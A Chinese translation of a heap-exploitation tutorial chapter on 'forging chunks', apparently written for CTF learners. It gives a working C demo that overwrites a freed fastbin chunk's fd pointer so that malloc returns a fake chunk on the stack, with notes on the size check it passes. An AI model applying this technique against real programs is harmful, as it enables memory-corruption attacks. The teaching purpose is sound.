---
title: Heap Exploitation系列翻译-10 Forging chunks
tags: [CTF, pwn, heap]
layout: post
categories: translations
---

> 本文是对Dhaval Kapil的[Heap Exploitation](https://heap-exploitation.dhavalkapil.com/)系列教程的译文

在堆块被释放后, 堆块会被插入到一个bin链表中. 然而它的指针在程序中依旧是可用的. 如果攻击这控制了这个指针, 那么他/她便可以修改bin的链表结构并插入他/她自己构造的`伪造`堆块. 以下的示例程序展示了在fastbin的释放链表中如何实现这一攻击.

```c
struct forged_chunk {
  size_t prev_size;
  size_t size;
  struct forged_chunk *fd;
  struct forged_chunk *bck;
  char buf[10];               // padding
};

// First grab a fast chunk
a = malloc(10);               // 'a' points to 0x219c010

// Create a forged chunk
struct forged_chunk chunk;    // At address 0x7ffc6de96690
chunk.size = 0x20;            // This size should fall in the same fastbin
data = (char *)&chunk.fd;     // Data starts here for an allocated chunk
strcpy(data, "attacker's data");

// Put the fast chunk back into fastbin
free(a);
// Modify 'fd' pointer of 'a' to point to our forged chunk
*((unsigned long long *)a) = (unsigned long long)&chunk;
// Remove 'a' from HEAD of fastbin
// Our forged chunk will now be at the HEAD of fastbin
malloc(10);                   // Will return 0x219c010

victim = malloc(10);          // Points to 0x7ffc6de966a0
printf("%s\n", victim);       // Prints "attacker's data" !!
```

伪造堆块的size设置为0x20, 这一就可以通过安全检查"malloc(): memory corruption (fast)", 这是用来检查堆块大小是否在特定fastbin的代销范围内. 同时要注意, 一块已分配的堆块, 它的存储数据起始于'fd'指针所在的地址. 这也就是为什么在上述程序中, `victim`指针指向了'伪造堆块'更前`0x10`(0x8+0x8)字节的位置处.

fastbin的状态变化如下:

1. 'a' freed.
  > head -> a -> tail
2. a's fd pointer changed to point to 'forged chunk'.
  > head -> a -> forged chunk -> undefined (fd of forged chunk will in fact be holding attacker's data)
3. 'malloc' request
  > head -> forged chunk -> undefined
4. 'malloc' request by victim
  > head -> undefined   [ forged chunk is returned to the victim ]

注意以下几点:

* 如果这里同一个bin链表再进行一次'malloc'申请fast chunk将导致段错误(segmentation fault)
* 尽管我们申请10字节大小并且设置伪造堆块的大小为32(0x20)bytes, 但是都在32bytes的fastbins堆块范围内.
* 换作small chunk和large chunk的攻击方法我们将在'House of Lore'见到
* 上述代码运行在64位机器上, 如果要在32位机器上运行, 请将`unsigned long long`换成`unisgned int`, 因为指针长度由8bytes变成了4bytes. 同样, 相比为伪造堆块使用32bytes, 这里用更小的17bytes左右也能奏效.
